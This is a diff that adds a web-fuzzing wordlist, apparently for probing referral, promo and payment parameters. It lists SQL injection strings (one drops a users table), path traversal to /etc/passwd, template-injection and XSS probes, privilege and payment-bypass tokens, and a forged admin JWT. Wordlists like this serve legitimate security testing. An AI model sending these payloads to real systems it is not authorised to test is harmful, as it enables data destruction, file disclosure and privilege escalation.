@@ -1,0 +1,41 @@
+admin
+superadmin
+root
+debug
+test
+1
+0
+-1
+null
+undefined
+true
+false
+1' OR '1'='1
+1 OR 1=1
+'; DROP TABLE users;--
+../../etc/passwd
+..%2f..%2fetc%2fpasswd
+%00admin
+admin%00
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+javascript:alert(1)
+'"><svg/onload=alert(1)>
+ref_admin
+ref_0
+ref_-1
+ref_999999999
+promo_FREE
+coupon_100
+vip_bypass
+payment_skip
+wallet_admin
+role_admin
+is_admin=1
+user_id=1
+token_leak
+session_hijack
+eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.sig
